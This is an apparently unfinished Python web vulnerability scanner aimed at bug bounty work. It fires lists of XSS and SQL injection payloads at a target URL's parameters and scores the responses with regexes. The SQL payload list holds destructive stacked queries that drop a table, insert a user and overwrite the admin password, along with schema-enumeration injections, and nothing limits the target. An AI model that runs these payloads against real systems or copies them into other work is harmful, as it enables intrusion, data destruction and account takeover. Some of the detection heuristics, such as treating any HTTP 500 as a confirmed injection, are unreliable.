#!/usr/bin/env python3
"""
Advanced Bug Scanner for Bug Bounty
Scans for XSS, SQL Injection, and Open Redirect vulnerabilities

Author: Security Researcher
Version: 1.0.0
"""

import requests
import re
import json
import time
import threading
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from tqdm import tqdm
import concurrent.futures
from fake_useragent import UserAgent
import random
import string

# Initialize colorama for colored output
init(autoreset=True)

class BugScanner:
    """
    Advanced bug scanner that detects XSS, SQL Injection, and Open Redirect vulnerabilities
    """
    
    def __init__(self, target_url, output_dir="scan_results"):
        """
        Initialize the bug scanner
        
        Args:
            target_url (str): Target URL to scan
            output_dir (str): Directory to save results
        """
        self.target_url = target_url
        self.output_dir = output_dir
        self.session = requests.Session()
        self.ua = UserAgent()
        self.vulnerabilities = []
        
        # Set up session headers
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        self.print_banner()
    
    def print_banner(self):
        """Print scanner banner"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                      ADVANCED BUG SCANNER                        ║
║                    XSS | SQLi | Open Redirect                    ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}Target: {self.target_url}
Output Directory: {self.output_dir}
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}
"""
        print(banner)
    
    def log(self, message, level="INFO"):
        """Log messages with timestamps and colors"""
        timestamp = time.strftime('%H:%M:%S')
        colors = {
            'INFO': Fore.BLUE,
            'SUCCESS': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'VULNERABILITY': Fore.MAGENTA
        }
        color = colors.get(level, Fore.WHITE)
        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def save_vulnerabilities(self):
        """Save vulnerabilities to JSON file"""
        import os
        os.makedirs(self.output_dir, exist_ok=True)
        output_file = os.path.join(self.output_dir, f"vulnerabilities_{int(time.time())}.json")
        with open(output_file, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        self.log(f"Vulnerabilities saved to {output_file}", "SUCCESS")
    
    def scan_xss(self, url, parameters):
        """
        Scan for Cross-Site Scripting (XSS) vulnerabilities with advanced detection
        
        Args:
            url (str): Target URL
            parameters (list): List of parameters to test
        """
        self.log("Starting advanced XSS vulnerability scan...", "INFO")
        
        # Advanced XSS payloads with unique identifiers
        xss_payloads = [
            # Basic script tags with unique identifiers
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert(String.fromCharCode(88,83,83,95,66,85,71,95,66,79,85,78,84,89,95,49,50,51))</script>",
            
            # Event handlers with unique identifiers
            "<img src=x onerror=alert('XSS_BUG_BOUNTY_123')>",
            "<svg onload=alert('XSS_BUG_BOUNTY_123')>",
            "<body onload=alert('XSS_BUG_BOUNTY_123')>",
            "<input onfocus=alert('XSS_BUG_BOUNTY_123') autofocus>",
            "<select onfocus=alert('XSS_BUG_BOUNTY_123') autofocus>",
            "<textarea onfocus=alert('XSS_BUG_BOUNTY_123') autofocus>",
            "<keygen onfocus=alert('XSS_BUG_BOUNTY_123') autofocus>",
            "<video><source onerror=alert('XSS_BUG_BOUNTY_123')>",
            "<audio src=x onerror=alert('XSS_BUG_BOUNTY_123')>",
            "<details open ontoggle=alert('XSS_BUG_BOUNTY_123')>",
            "<marquee onstart=alert('XSS_BUG_BOUNTY_123')>",
            
            # JavaScript URLs with unique identifiers
            "javascript:alert('XSS_BUG_BOUNTY_123')",
            "javascript:void(alert('XSS_BUG_BOUNTY_123'))",
            
            # Iframe with unique identifier
            "<iframe src=javascript:alert('XSS_BUG_BOUNTY_123')></iframe>",
            
            # Advanced payloads with unique identifiers
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS_BUG_BOUNTY_123')</script>\">",
            "<table background=\"javascript:alert('XSS_BUG_BOUNTY_123')\">",
            "<object data=\"javascript:alert('XSS_BUG_BOUNTY_123')\">",
            "<embed src=\"javascript:alert('XSS_BUG_BOUNTY_123')\">",
            "<link rel=\"stylesheet\" href=\"javascript:alert('XSS_BUG_BOUNTY_123')\">",
            
            # CSS-based payloads with unique identifiers
            "<style>@import'javascript:alert(\"XSS_BUG_BOUNTY_123\")';</style>",
            "<style>body{-moz-binding:url(\"javascript:alert('XSS_BUG_BOUNTY_123')\")}</style>",
            "<div style=\"background-image:url(javascript:alert('XSS_BUG_BOUNTY_123'))\">",
            "<div style=\"width:expression(alert('XSS_BUG_BOUNTY_123'))\">",
            "<div style=\"background:url('javascript:alert(\\'XSS_BUG_BOUNTY_123\\')')\">",
            "<div style=\"background:url('data:text/html,<script>alert(\\'XSS_BUG_BOUNTY_123\\')</script>')\">",
            "<div style=\"background:url('vbscript:msgbox(\\'XSS_BUG_BOUNTY_123\\')')\">",
            "<div style=\"background:url('data:text/html,<svg onload=alert(\\'XSS_BUG_BOUNTY_123\\')>')\">",
            "<div style=\"background:url('data:text/html,<img src=x onerror=alert(\\'XSS_BUG_BOUNTY_123\\')>')\">",
            
            # Filter bypass payloads with unique identifiers
            "<ScRiPt>alert('XSS_BUG_BOUNTY_123')</ScRiPt>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            "<script>alert('XSS_BUG_BOUNTY_123')</script>",
            
            # URL encoding bypasses
            "%3Cscript%3Ealert('XSS_BUG_BOUNTY_123')%3C/script%3E",
            "%3Cimg%20src=x%20onerror=alert('XSS_BUG_BOUNTY_123')%3E",
            
            # Double encoding bypasses
            "%253Cscript%253Ealert('XSS_BUG_BOUNTY_123')%253C/script%253E",
            "%253Cimg%2520src=x%2520onerror=alert('XSS_BUG_BOUNTY_123')%253E",
            
            # HTML entity bypasses
            "&lt;script&gt;alert('XSS_BUG_BOUNTY_123')&lt;/script&gt;",
            "&lt;img src=x onerror=alert('XSS_BUG_BOUNTY_123')&gt;",
            
            # Unicode bypasses
            "\u003cscript\u003ealert('XSS_BUG_BOUNTY_123')\u003c/script\u003e",
            "\u003cimg src=x onerror=alert('XSS_BUG_BOUNTY_123')\u003e"
        ]
        
        for param in tqdm(parameters, desc="XSS Testing"):
            for payload in xss_payloads:
                try:
                    # Test reflected XSS with multiple confirmation methods
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # Advanced XSS confirmation
                    xss_confirmed = self.confirm_xss_vulnerability(response, payload, param)
                    
                    if xss_confirmed['confirmed']:
                        vulnerability = {
                            'type': 'XSS',
                            'subtype': xss_confirmed['subtype'],
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': xss_confirmed['severity'],
                            'description': f'{xss_confirmed["subtype"]} found in parameter {param}',
                            'evidence': xss_confirmed['evidence'],
                            'confidence': xss_confirmed['confidence']
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"XSS vulnerability confirmed in parameter: {param} (Confidence: {xss_confirmed['confidence']}%)", "VULNERABILITY")
                
                except Exception as e:
                    continue
        
        self.log(f"XSS scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'XSS'])} confirmed vulnerabilities", "SUCCESS")
    
    def confirm_xss_vulnerability(self, response, payload, parameter):
        """
        Advanced XSS vulnerability confirmation with multiple validation methods
        
        Args:
            response: HTTP response object
            payload: XSS payload used
            parameter: Parameter name being tested
            
        Returns:
            dict: Confirmation result with details
        """
        confirmation_result = {
            'confirmed': False,
            'subtype': 'Unknown',
            'severity': 'Low',
            'confidence': 0,
            'evidence': '',
            'validation_methods': []
        }
        
        try:
            response_text = response.text
            confidence_score = 0
            validation_methods = []
            
            # Method 1: Direct payload reflection (High confidence)
            if 'XSS_BUG_BOUNTY_123' in response_text:
                confidence_score += 40
                validation_methods.append('Direct payload reflection')
                confirmation_result['confirmed'] = True
                confirmation_result['subtype'] = 'Reflected XSS'
                confirmation_result['severity'] = 'High'
            
            # Method 2: Script tag execution patterns (High confidence)
            script_patterns = [
                r'<script[^>]*>.*XSS_BUG_BOUNTY_123.*</script>',
                r'<script[^>]*>.*alert\(.*XSS_BUG_BOUNTY_123.*\).*</script>',
                r'<script[^>]*>.*String\.fromCharCode.*XSS_BUG_BOUNTY_123.*</script>'
            ]
            
            for pattern in script_patterns:
                if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                    confidence_score += 35
                    validation_methods.append('Script tag execution pattern')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'Reflected XSS'
                    confirmation_result['severity'] = 'High'
                    break
            
            # Method 3: Event handler patterns (Medium-High confidence)
            event_patterns = [
                r'onerror\s*=\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)',
                r'onload\s*=\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)',
                r'onfocus\s*=\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)',
                r'onclick\s*=\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)',
                r'ontoggle\s*=\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)',
                r'onstart\s*=\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)'
            ]
            
            for pattern in event_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence_score += 30
                    validation_methods.append('Event handler pattern')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'Reflected XSS'
                    confirmation_result['severity'] = 'High'
                    break
            
            # Method 4: JavaScript URL patterns (Medium confidence)
            js_url_patterns = [
                r'javascript\s*:\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)',
                r'javascript\s*:\s*void\s*\(\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)\s*\)'
            ]
            
            for pattern in js_url_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence_score += 25
                    validation_methods.append('JavaScript URL pattern')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'Reflected XSS'
                    confirmation_result['severity'] = 'Medium'
                    break
            
            # Method 5: CSS-based XSS patterns (Medium confidence)
            css_patterns = [
                r'background\s*:\s*url\s*\(\s*[\'"]javascript\s*:\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)[\'"]\s*\)',
                r'background-image\s*:\s*url\s*\(\s*[\'"]javascript\s*:\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)[\'"]\s*\)',
                r'width\s*:\s*expression\s*\(\s*alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)\s*\)'
            ]
            
            for pattern in css_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence_score += 25
                    validation_methods.append('CSS-based XSS pattern')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'CSS-based XSS'
                    confirmation_result['severity'] = 'Medium'
                    break
            
            # Method 6: Data URL patterns (Medium confidence)
            data_url_patterns = [
                r'data\s*:\s*text/html\s*,\s*<script>alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)</script>',
                r'data\s*:\s*text/html\s*,\s*<svg\s+onload=alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)>',
                r'data\s*:\s*text/html\s*,\s*<img\s+src=x\s+onerror=alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)>'
            ]
            
            for pattern in data_url_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence_score += 25
                    validation_methods.append('Data URL pattern')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'Data URL XSS'
                    confirmation_result['severity'] = 'Medium'
                    break
            
            # Method 7: Filter bypass detection (Low-Medium confidence)
            bypass_patterns = [
                r'<ScRiPt>alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)</ScRiPt>',
                r'%3Cscript%3Ealert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)%3C/script%3E',
                r'%253Cscript%253Ealert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)%253C/script%253E',
                r'&lt;script&gt;alert\s*\(\s*[\'"]XSS_BUG_BOUNTY_123[\'"]\s*\)&lt;/script&gt;'
            ]
            
            for pattern in bypass_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence_score += 20
                    validation_methods.append('Filter bypass pattern')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = 'Filter Bypass XSS'
                    confirmation_result['severity'] = 'Medium'
                    break
            
            # Method 8: Parameter reflection without encoding (Low confidence)
            if parameter in response_text and 'XSS_BUG_BOUNTY_123' in response_text:
                # Check if parameter value is reflected without proper encoding
                param_reflection_pattern = rf'{re.escape(parameter)}\s*=\s*[^&]*XSS_BUG_BOUNTY_123'
                if re.search(param_reflection_pattern, response_text, re.IGNORECASE):
                    confidence_score += 15
                    validation_methods.append('Parameter reflection without encoding')
                    if not confirmation_result['confirmed']:
                        confirmation_result['confirmed'] = True
                        confirmation_result['subtype'] = 'Potential Reflected XSS'
                        confirmation_result['severity'] = 'Low'
            
            # Method 9: Content-Type header analysis
            content_type = response.headers.get('Content-Type', '').lower()
            if 'text/html' in content_type and confirmation_result['confirmed']:
                confidence_score += 10
                validation_methods.append('HTML content type')
            
            # Method 10: Response size analysis (potential stored XSS)
            if len(response_text) > 10000 and 'XSS_BUG_BOUNTY_123' in response_text:
                # Large response with payload might indicate stored XSS
                confidence_score += 5
                validation_methods.append('Large response size (potential stored XSS)')
                if confirmation_result['subtype'] == 'Reflected XSS':
                    confirmation_result['subtype'] = 'Potential Stored XSS'
                    confirmation_result['severity'] = 'Critical'
            
            # Set final confidence and evidence
            confirmation_result['confidence'] = min(confidence_score, 100)
            confirmation_result['validation_methods'] = validation_methods
            
            if confirmation_result['confirmed']:
                evidence_parts = []
                if 'XSS_BUG_BOUNTY_123' in response_text:
                    evidence_parts.append('Unique identifier found in response')
                if validation_methods:
                    evidence_parts.append(f'Validated by: {", ".join(validation_methods)}')
                if confirmation_result['confidence'] >= 70:
                    evidence_parts.append('High confidence detection')
                
                confirmation_result['evidence'] = '; '.join(evidence_parts)
            
            return confirmation_result
            
        except Exception as e:
            self.log(f"Error in XSS confirmation: {e}", "WARNING")
            return confirmation_result
    
    def check_stored_xss(self, response, payload):
        """Check for potential stored XSS"""
        try:
            # This is a simplified check - in real implementation, you would
            # need to submit the payload and then check if it appears in other responses
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if payload appears in form fields or content areas
            for tag in soup.find_all(['input', 'textarea', 'div', 'span', 'p']):
                if payload in str(tag):
                    return True
            
            return False
        except:
            return False
    
    def scan_sql_injection(self, url, parameters):
        """
        Scan for SQL Injection vulnerabilities with advanced detection
        
        Args:
            url (str): Target URL
            parameters (list): List of parameters to test
        """
        self.log("Starting advanced SQL Injection vulnerability scan...", "INFO")
        
        # Advanced SQL Injection payloads with unique identifiers
        sql_payloads = [
            # Basic SQL injection with unique identifiers
            "' OR '1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR 1=1-- AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR 1=1# AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR 1=1/* AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "') OR ('1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "') OR (1=1-- AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "') OR (1=1# AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "') OR (1=1/* AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            
            # Union-based SQL injection with unique identifiers
            "' UNION SELECT 'SQL_BUG_BOUNTY_123',2,3--",
            "' UNION SELECT 1,'SQL_BUG_BOUNTY_123',3,4,5--",
            "' UNION SELECT NULL,'SQL_BUG_BOUNTY_123',NULL--",
            "' UNION SELECT user(),'SQL_BUG_BOUNTY_123',version()--",
            "' UNION SELECT table_name,'SQL_BUG_BOUNTY_123',NULL FROM information_schema.columns--",
            
            # Boolean-based blind SQL injection with unique identifiers
            "' AND 1=1 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            "' AND 1=2 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)=0 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            
            # Time-based blind SQL injection with unique identifiers
            "'; WAITFOR DELAY '00:00:05' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            "'; SELECT SLEEP(5) AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            "'; SELECT pg_sleep(5) AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123--",
            "'; SELECT dbms_pipe.receive_message((SELECT 'SQL_BUG_BOUNTY_123'),5)--",
            
            # Error-based SQL injection with unique identifiers
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT('SQL_BUG_BOUNTY_123',version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, 'SQL_BUG_BOUNTY_123', (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT('SQL_BUG_BOUNTY_123',CAST(schema_name AS CHAR),0x7e)) FROM information_schema.schemata LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Stacked queries with unique identifiers
            "'; DROP TABLE IF EXISTS sql_bug_bounty_123; --",
            "'; INSERT INTO users (username, password) VALUES ('sql_bug_bounty_123', 'password'); --",
            "'; UPDATE users SET password='sql_bug_bounty_123' WHERE username='admin'; --",
            
            # Second-order SQL injection with unique identifiers
            "admin'-- AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "admin'/* AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "admin'# AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            
            # NoSQL injection with unique identifiers
            "' || '1'=='1' && 'SQL_BUG_BOUNTY_123'=='SQL_BUG_BOUNTY_123",
            "' || 1==1 && 'SQL_BUG_BOUNTY_123'=='SQL_BUG_BOUNTY_123",
            "'; return 'SQL_BUG_BOUNTY_123' == 'SQL_BUG_BOUNTY_123; //",
            "'; return false && 'SQL_BUG_BOUNTY_123'=='SQL_BUG_BOUNTY_123; //",
            
            # Advanced payloads with unique identifiers
            "' OR 'x'='x' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR 'a'='a' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR 'test'='test' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR 'admin'='admin' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            
            # Numeric SQL injection with unique identifiers
            "1 OR 1=1 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "1' OR '1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "1) OR (1=1 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "1)) OR ((1=1 AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            
            # Filter bypass payloads with unique identifiers
            "' OR '1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR '1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR '1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123",
            "' OR '1'='1' AND 'SQL_BUG_BOUNTY_123'='SQL_BUG_BOUNTY_123"
        ]
        
        for param in tqdm(parameters, desc="SQLi Testing"):
            for payload in sql_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Advanced SQL injection confirmation
                    sql_confirmed = self.confirm_sql_injection(response, payload, param)
                    
                    if sql_confirmed['confirmed']:
                        vulnerability = {
                            'type': 'SQL Injection',
                            'subtype': sql_confirmed['subtype'],
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': sql_confirmed['severity'],
                            'description': f'{sql_confirmed["subtype"]} found in parameter {param}',
                            'evidence': sql_confirmed['evidence'],
                            'confidence': sql_confirmed['confidence']
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.log(f"SQL Injection vulnerability confirmed in parameter: {param} (Confidence: {sql_confirmed['confidence']}%)", "VULNERABILITY")
                
                except Exception as e:
                    continue
        
        self.log(f"SQL Injection scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'SQL Injection'])} confirmed vulnerabilities", "SUCCESS")
    
    def confirm_sql_injection(self, response, payload, parameter):
        """
        Advanced SQL injection vulnerability confirmation with multiple validation methods
        
        Args:
            response: HTTP response object
            payload: SQL injection payload used
            parameter: Parameter name being tested
            
        Returns:
            dict: Confirmation result with details
        """
        confirmation_result = {
            'confirmed': False,
            'subtype': 'Unknown',
            'severity': 'Low',
            'confidence': 0,
            'evidence': '',
            'validation_methods': []
        }
        
        try:
            response_text = response.text
            confidence_score = 0
            validation_methods = []
            
            # Method 1: SQL error message detection (High confidence)
            sql_errors = [
                # MySQL errors
                (r"SQL syntax.*MySQL", "MySQL", 40),
                (r"Warning.*mysql_.*", "MySQL", 35),
                (r"valid MySQL result", "MySQL", 30),
                (r"MySqlClient\.", "MySQL", 35),
                (r"mysql_fetch_array", "MySQL", 30),
                (r"mysql_num_rows", "MySQL", 30),
                (r"mysql_query", "MySQL", 30),
                (r"mysql_connect", "MySQL", 30),
                (r"mysql_error", "MySQL", 35),
                
                # PostgreSQL errors
                (r"PostgreSQL.*ERROR", "PostgreSQL", 40),
                (r"Warning.*\Wpg_.*", "PostgreSQL", 35),
                (r"valid PostgreSQL result", "PostgreSQL", 30),
                (r"Npgsql\.", "PostgreSQL", 35),
                (r"pg_query", "PostgreSQL", 30),
                (r"pg_connect", "PostgreSQL", 30),
                (r"pg_exec", "PostgreSQL", 30),
                (r"pg_fetch_array", "PostgreSQL", 30),
                
                # SQL Server errors
                (r"Microsoft.*ODBC.*SQL Server", "SQL Server", 40),
                (r"SQLServer JDBC Driver", "SQL Server", 35),
                (r"Microsoft OLE DB Provider for ODBC Drivers", "SQL Server", 35),
                (r"Microsoft OLE DB Provider for SQL Server", "SQL Server", 35),
                (r"Incorrect syntax near", "SQL Server", 40),
                (r"Unclosed quotation mark", "SQL Server", 35),
                (r"Invalid column name", "SQL Server", 35),
                (r"Invalid object name", "SQL Server", 35),
                
                # Oracle errors
                (r"ORA-\d{5}", "Oracle", 40),
                (r"Oracle error", "Oracle", 35),
                (r"Oracle.*Driver", "Oracle", 35),
                (r"Warning.*\Woci_.*", "Oracle", 35),
                (r"ORA-00933", "Oracle", 40),
                (r"ORA-00936", "Oracle", 40),
                (r"ORA-00942", "Oracle", 40),
                (r"ORA-01756", "Oracle", 40),
                
                # SQLite errors
                (r"SQLite.*error", "SQLite", 35),
                (r"SQLite3::SQLException", "SQLite", 35),
                (r"Warning.*\Wsqlite_.*", "SQLite", 30),
                (r"Warning.*\Wsqlite3_.*", "SQLite", 30),
                (r"sqlite3_exec", "SQLite", 30),
                (r"sqlite3_prepare", "SQLite", 30),
                
                # Generic SQL errors
                (r"SQLSTATE.*SQLCODE", "Generic SQL", 30),
                (r"SQLException", "Generic SQL", 30),
                (r"Warning.*\Wsybase_.*", "Sybase", 30),
                (r"Warning.*\Wifx_.*", "Informix", 30),
                (r"Warning.*\Wdb2_.*", "DB2", 30),
                (r"Warning.*\Wmssql_.*", "SQL Server", 30),
                
                # NoSQL errors
                (r"MongoDB.*error", "MongoDB", 35),
                (r"MongoException", "MongoDB", 35),
                (r"CouchDB.*error", "CouchDB", 35),
                (r"Cassandra.*error", "Cassandra", 35)
            ]
            
            for error_pattern, db_type, confidence in sql_errors:
                if re.search(error_pattern, response_text, re.IGNORECASE):
                    confidence_score += confidence
                    validation_methods.append(f'{db_type} error message')
                    confirmation_result['confirmed'] = True
                    confirmation_result['subtype'] = f'{db_type} Error-based SQL Injection'
                    confirmation_result['severity'] = 'Critical'
                    break
            
            # Method 2: Unique identifier detection (High confidence)
            if 'SQL_BUG_BOUNTY_123' in response_text:
                confidence_score += 35
                validation_methods.append('Unique identifier reflection')
                confirmation_result['confirmed'] = True
                if not confirmation_result['subtype']:
                    confirmation_result['subtype'] = 'Union-based SQL Injection'
                    confirmation_result['severity'] = 'Critical'
            
            # Method 3: Response time analysis for time-based SQL injection
            if any(keyword in payload.lower() for keyword in ['sleep', 'waitfor', 'delay', 'pg_sleep']):
                # This would need to be implemented with actual timing measurements
                # For now, we'll check if the response took longer than expected
                if response.elapsed.total_seconds() > 3:  # Basic timing check
                    confidence_score += 25
                    validation_methods.append('Time-based delay detected')
                    confirmation_result['confirmed'] = True
                    if not confirmation_result['subtype']:
                        confirmation_result['subtype'] = 'Time-based Blind SQL Injection'
                        confirmation_result['severity'] = 'High'
            
            # Method 4: Boolean-based SQL injection detection
            if '1=1' in payload or '1=2' in payload:
                # This would need to be implemented with response comparison
                # For now, we'll check for common boolean-based indicators
                boolean_indicators = [
                    r'login.*successful',
                    r'welcome.*user',
                    r'authentication.*success',
                    r'access.*granted',
                    r'login.*failed',
                    r'authentication.*failed',
                    r'access.*denied',
                    r'invalid.*credentials'
                ]
                
                for indicator in boolean_indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        confidence_score += 20
                        validation_methods.append('Boolean-based response difference')
                        confirmation_result['confirmed'] = True
                        if not confirmation_result['subtype']:
                            confirmation_result['subtype'] = 'Boolean-based Blind SQL Injection'
                            confirmation_result['severity'] = 'High'
                        break
            
            # Method 5: Union-based SQL injection detection
            if 'UNION' in payload.upper() and 'SQL_BUG_BOUNTY_123' in response_text:
                confidence_score += 30
                validation_methods.append('Union-based data extraction')
                confirmation_result['confirmed'] = True
                confirmation_result['subtype'] = 'Union-based SQL Injection'
                confirmation_result['severity'] = 'Critical'
            
            # Method 6: Stacked query detection
            if any(keyword in payload.upper() for keyword in ['DROP', 'INSERT', 'UPDATE', 'DELETE']):
                # Check for execution confirmation
                execution_indicators = [
                    r'table.*dropped',
                    r'record.*inserted',
                    r'record.*updated',
                    r'record.*deleted',
                    r'query.*executed',
                    r'command.*completed'
                ]
                
                for indicator in execution_indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        confidence_score += 35
                        validation_methods.append('Stacked query execution')
                        confirmation_result['confirmed'] = True
                        confirmation_result['subtype'] = 'Stacked Queries SQL Injection'
                        confirmation_result['severity'] = 'Critical'
                        break
            
            # Method 7: NoSQL injection detection
            if any(keyword in payload for keyword in ['||', '&&', 'return', 'true', 'false']):
                nosql_indicators = [
                    r'mongodb.*query',
                    r'nosql.*error',
                    r'json.*parse.*error',
                    r'invalid.*json',
                    r'query.*syntax.*error'
                ]
                
                for indicator in nosql_indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        confidence_score += 25
                        validation_methods.append('NoSQL injection indicator')
                        confirmation_result['confirmed'] = True
                        if not confirmation_result['subtype']:
                            confirmation_result['subtype'] = 'NoSQL Injection'
                            confirmation_result['severity'] = 'High'
                        break
            
            # Method 8: Response size analysis
            if len(response_text) > 50000:  # Large response might indicate data extraction
                confidence_score += 10
                validation_methods.append('Large response size (potential data extraction)')
            
            # Method 9: Content-Type analysis
            content_type = response.headers.get('Content-Type', '').lower()
            if 'application/json' in content_type and confirmation_result['confirmed']:
                confidence_score += 5
                validation_methods.append('JSON response format')
            
            # Method 10: HTTP status code analysis
            if response.status_code == 500:  # Internal server error might indicate SQL injection
                confidence_score += 15
                validation_methods.append('HTTP 500 error (potential SQL injection)')
            
            # Set final confidence and evidence
            confirmation_result['confidence'] = min(confidence_score, 100)
            confirmation_result['validation_methods'] = validation_methods
            
            if confirmation_result['confirmed']:
                evidence_parts = []
                if 'SQL_BUG_BOUNTY_123' in response_text:
                    evidence_parts.append('Unique identifier found in response')
                if validation_methods:
                    evidence_parts.append(f'Validated by: {", ".join(validation_methods)}')
                if confirmation_result['confidence'] >= 70:
                    evidence_parts.append('High confidence detection')
                
                confirmation_result['evidence'] = '; '.join(evidence_parts)
            
            return confirmation_result
            
        except Exception as e:
            self.log(f"Error in SQL injection confirmation: {e}", "WARNING")
            return confirmation_result
    
